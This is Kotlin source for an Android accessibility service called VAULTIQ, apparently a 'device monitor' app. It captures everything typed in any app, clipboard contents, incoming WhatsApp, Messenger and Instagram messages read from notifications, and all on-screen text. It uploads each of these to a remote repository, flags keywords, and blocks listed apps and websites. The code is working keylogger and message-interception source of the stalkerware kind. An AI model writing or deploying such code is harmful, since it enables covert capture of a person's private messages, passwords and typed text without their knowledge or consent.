package com.devicemonitor.service

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicemonitor.data.models.*
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.Constants
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

/**
 * VAULTIQ - High-Efficiency Accessibility Monitor
 * Features: Keystroke Logging, Clipboard Capture, App Blocking, and Web Filtering.
 */
class MonitorAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val repository = DeviceRepository()
    private var lastClipboardText: String? = null
    private val processedMessages = mutableSetOf<String>()
    private var lastScreenContextHash: Int = 0
    private var blockedAppsCache: Set<String> = emptySet()
    private var lastCacheUpdate: Long = 0
    private var blockedDomains: HashSet<String> = HashSet()

    private var lastTypedText = ""
    private var lastAppPackage = ""
    private var lastTypingTime = 0L

    private val browserPackages = setOf(
        "com.android.chrome", "com.chrome.beta", "org.mozilla.firefox", 
        "com.opera.browser", "com.microsoft.emmx", "com.brave.browser",
        "com.sec.android.app.sbrowser", "com.huawei.browser"
    )
    
    private val supportedMessengers = mapOf(
        "com.whatsapp" to "whatsapp", 
        "com.facebook.orca" to "messenger", 
        "com.instagram.android" to "instagram"
    )

    override fun onCreate() {
        super.onCreate()
        loadBlockedDomains()
        (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).addPrimaryClipChangedListener {
            val text = (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).primaryClip?.getItemAt(0)?.text?.toString()
            if (!text.isNullOrBlank() && text != lastClipboardText) {
                lastClipboardText = text
                serviceScope.launch { 
                    repository.insertClipboardEntry(ClipboardEntry(
                        device_id = Constants.getDeviceId(this@MonitorAccessibilityService), 
                        content = text, 
                        recorded_at = getNow()
                    )) 
                }
            }
        }
    }

    private fun loadBlockedDomains() {
        serviceScope.launch {
            try {
                val domains = hashSetOf<String>()
                assets.open("blocked_domains.txt").bufferedReader().useLines { lines ->
                    lines.forEach { domains.add(it.trim().lowercase()) }
                }
                blockedDomains = domains
            } catch (e: Exception) { }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: ""
        
        // App Blocking Logic
        if (System.currentTimeMillis() - lastCacheUpdate > 600000) updateBlockedAppsCache()
        if (blockedAppsCache.contains(packageName)) performGlobalAction(GLOBAL_ACTION_HOME)

        // Web Filter Logic (Block restricted sites)
        if (browserPackages.contains(packageName)) {
            checkWebFilter(event)
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event, packageName)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleKeystroke(event, packageName)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleScreenContext(packageName)
        }
    }

    private fun checkWebFilter(event: AccessibilityEvent) {
        val root = rootInActiveWindow ?: return
        val url = findUrlInNodes(root) ?: return
        
        val domain = extractDomain(url)
        if (blockedDomains.contains(domain)) {
            // Block the site by going back or home
            performGlobalAction(GLOBAL_ACTION_BACK)
            
            serviceScope.launch {
                repository.insertRiskAlert(RiskAlert(
                    device_id = Constants.getDeviceId(this@MonitorAccessibilityService),
                    alert_type = "web_block",
                    severity = "medium",
                    description = "Access blocked to restricted domain: $domain",
                    source = "Web Filter",
                    content = url,
                    recorded_at = getNow()
                ))
            }
        }
    }

    private fun findUrlInNodes(node: AccessibilityNodeInfo): String? {
        val stack = Stack<AccessibilityNodeInfo>()
        stack.push(node)
        while (stack.isNotEmpty()) {
            val n = stack.pop() ?: continue
            // Check common browser URL bar patterns
            if (n.viewIdResourceName?.contains("url_bar") == true || 
                n.viewIdResourceName?.contains("location_bar") == true ||
                n.viewIdResourceName?.contains("url_edit_text") == true) {
                return n.text?.toString()
            }
            // Fallback for generic text nodes that look like URLs
            val text = n.text?.toString()
            if (text != null && text.length > 5 && text.contains(".")) {
                if (text.startsWith("http") || (!text.contains(" ") && text.count { it == '.' } >= 1)) {
                    return text
                }
            }
            for (i in 0 until n.childCount) {
                n.getChild(i)?.let { stack.push(it) }
            }
        }
        return null
    }

    private fun extractDomain(url: String): String {
        var cleanUrl = url.lowercase().trim()
            .replace("https://", "")
            .replace("http://", "")
            .replace("www.", "")
        val slashIndex = cleanUrl.indexOf("/")
        if (slashIndex != -1) cleanUrl = cleanUrl.substring(0, slashIndex)
        val portIndex = cleanUrl.indexOf(":")
        if (portIndex != -1) cleanUrl = cleanUrl.substring(0, portIndex)
        return cleanUrl
    }

    private fun handleNotification(event: AccessibilityEvent, packageName: String) {
        val messengerType = supportedMessengers[packageName] ?: return
        val title = event.text?.firstOrNull()?.toString() ?: "System"
        val text = event.text?.getOrNull(1)?.toString() ?: ""
        if (text.isBlank()) return

        val msgKey = "$messengerType|$title|$text"
        if (processedMessages.contains(msgKey)) return
        if (processedMessages.size > 500) processedMessages.clear()
        processedMessages.add(msgKey)

        serviceScope.launch {
            repository.insertMessengerMessage(MessengerMessage(
                device_id = Constants.getDeviceId(this@MonitorAccessibilityService), 
                messenger_type = messengerType, 
                contact_name = title, 
                content = text, 
                message_type = "received", 
                message_timestamp = getNow(), 
                recorded_at = getNow()
            ))
            checkKeywords(text, messengerType)
        }
    }

    private fun handleKeystroke(event: AccessibilityEvent, packageName: String) {
        val text = event.text?.firstOrNull()?.toString() ?: return
        val now = System.currentTimeMillis()
        if (packageName != lastAppPackage || now - lastTypingTime > 5000) {
            if (lastTypedText.isNotBlank()) saveKeystroke()
            lastAppPackage = packageName
        }
        lastTypedText = text
        lastTypingTime = now
    }

    private fun saveKeystroke() {
        val text = lastTypedText
        val pkg = lastAppPackage
        serviceScope.launch {
            repository.insertKeystroke(Keystroke(
                device_id = Constants.getDeviceId(this@MonitorAccessibilityService), 
                text_content = text, 
                package_name = pkg, 
                recorded_at = getNow()
            ))
            checkKeywords(text, "keystroke")
        }
        lastTypedText = ""
    }

    private fun handleScreenContext(packageName: String) {
        val root = rootInActiveWindow ?: return
        val text = extractAllText(root)
        if (text.hashCode() != lastScreenContextHash) {
            lastScreenContextHash = text.hashCode()
            serviceScope.launch { 
                repository.insertAppScreenContext(AppScreenContext(
                    device_id = Constants.getDeviceId(this@MonitorAccessibilityService), 
                    app_package = packageName, 
                    app_name = packageName, 
                    screen_text = text, 
                    recorded_at = getNow()
                )) 
            }
        }
    }

    private fun checkKeywords(content: String, source: String) {
        val keywords = Constants.getMonitoredKeywords(this)
        keywords.forEach { kw ->
            if (content.contains(kw, ignoreCase = true)) {
                serviceScope.launch { 
                    repository.insertRiskAlert(RiskAlert(
                        device_id = Constants.getDeviceId(this@MonitorAccessibilityService), 
                        alert_type = "keyword_detected", 
                        severity = "high", 
                        description = "Keyword found: $kw", 
                        source = source, 
                        content = content, 
                        recorded_at = getNow()
                    )) 
                }
            }
        }
    }

    private fun extractAllText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        val stack = Stack<AccessibilityNodeInfo>()
        stack.push(node)
        while (stack.isNotEmpty()) {
            val n = stack.pop() ?: continue
            n.text?.let { sb.append(it).append(" ") }
            for (i in 0 until n.childCount) {
                n.getChild(i)?.let { stack.push(it) }
            }
        }
        return sb.toString().trim()
    }

    private fun updateBlockedAppsCache() {
        serviceScope.launch {
            blockedAppsCache = repository.getBlockedApps(Constants.getDeviceId(this@MonitorAccessibilityService)).map { it.package_name }.toSet()
            lastCacheUpdate = System.currentTimeMillis()
        }
    }

    private fun getNow() = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())

    override fun onInterrupt() {}
    override fun onDestroy() { 
        super.onDestroy()
        serviceScope.cancel() 
    }
}
